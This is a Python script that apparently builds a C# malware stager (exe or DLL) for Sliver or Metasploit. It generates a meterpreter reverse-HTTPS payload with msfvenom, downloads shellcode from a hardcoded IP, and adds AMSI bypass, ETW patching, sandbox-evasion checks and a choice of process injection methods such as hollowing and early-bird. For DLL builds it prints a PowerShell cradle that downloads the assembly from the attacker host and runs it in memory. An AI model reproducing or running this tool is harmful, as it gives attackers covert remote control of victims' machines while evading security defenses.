#!/bin/env python3
import ak
import os
import subprocess
import argparse

BASE_FILENAME = 'win_msf_sliver_stager'
FN_CS = BASE_FILENAME + ".cs"

MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
STAGER_URL = "http://192.168.49.65/sc"

import_choices = {
  'hollowing':f"{ak.START_PROCESS_HOLLOW_IMPORT}",
  'ntcreate':f"{ak.START_PROCESS_INTERPROCESS_IMPORT}",
  'earlybird':f"{ak.START_PROCESS_EARLYBIRD_IMPORT}",
  'standard':f"{ak.START_SHELLCODE_IMPORT}"
}

main_choices = {
  'hollowing':f"{ak.START_PROCESS_HOLLOW_CODE}",
  'ntcreate':f"{ak.START_PROCESS_INTERPROCESS_CODE}",
  'earlybird':f"{ak.START_PROCESS_EARLYBIRD_CODE}",
  'standard':f"{ak.START_SHELLCODE}"
}

templates = {
  'exe': """
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace SliverStager
{{
    public class Stager
    {{
    {imports}
        public static void Main()
        {{
        {main_code}
        }}

    }}
}}
""",
  'dll': """
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace LeMans
{{
    public class Class1
    {{
        {imports}

        public static void ferrari()
        {{
          {main_code}

        }}
    }}
}}
"""
}

def get_shellcode(msfvenom_cmd):
  shellcode = subprocess.check_output(msfvenom_cmd, shell=True)

  return shellcode

def generate(args):
  url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=STAGER_URL)

  imports = f"""
        {ak.HEURISTICS_IMPORT}
        {ak.ARCH_DETECTION}
        {ak.ETW_FUNCS}
        {ak.AMSI_BYPASS_IMPORT}
  """

  main_code = f"""
            {ak.HEURISTICS_CODE}
            {ak.ETW_PATCH}
            {url_dl_code}
  """

  imports += import_choices[args.injection]
  main_code += main_choices[args.injection]

  template = templates[args.format].format(imports=imports,main_code=main_code)

  ak.write_file(FN_CS, template)


def generate_shellcode():
  shellcode = get_shellcode(MSFVENOM_CMD)
  ak.write_file(FN_SHELLCODE, shellcode)

def main():
  # generate_shellcode()

  parser = argparse.ArgumentParser()
  parser.add_argument('--injection', '-i', default='standard', choices=['standard', 'earlybird', 'ntcreate', 'hollowing'])
  parser.add_argument('--format', '-f', default='exe', choices=['exe', 'dll'])
  args = parser.parse_args()

  generate(args)

  flags = ""

  if args.format == 'dll':
    flags = "/target:library"

  ak.cs_compile(FN_CS, flags=flags)

  if args.format == 'dll':
      print("Load with:")
      ps = """
    $data = (New-Object System.Net.WebClient).DownloadData('http://{lhost}/{fn}')
    $assem = [System.Reflection.Assembly]::Load($data)

    $class = $assem.GetType('LeMans.Class1')
    $method = $class.GetMethod("ferrari")
    $method.Invoke(0, $null)
    """.format(fn=BASE_FILENAME + '.dll', lhost=ak.LHOST)
      print(ps)

if __name__ == "__main__":
  main()
